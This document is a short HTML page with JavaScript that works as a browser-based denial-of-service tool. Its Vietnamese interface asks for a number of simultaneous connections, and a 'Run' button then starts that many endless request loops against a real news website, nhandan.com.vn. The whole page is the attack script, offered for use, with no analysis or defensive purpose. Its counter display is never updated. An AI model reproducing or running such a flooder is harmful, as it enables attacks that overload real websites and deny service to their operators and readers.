<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

    <input type="number" id="number" placeholder="số lượng connect cùng lúc">
    <button id="run">Chạy</button>
    <h1 id="h1"></h1>
</body>
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    var total_count = 0
    var h1 = document.getElementById('h1')
    async function loadXMLDoc() {
        while (true) {
            await axios.get('https://nhandan.com.vn')
            h1.innerText = total_count
        }
    }

    document.getElementById('run').onclick = async function () {
        var total = Number(document.getElementById('number').value)
        for (let index = 0; index < total; index++) {
            loadXMLDoc()
        }
    }
</script>
</html>
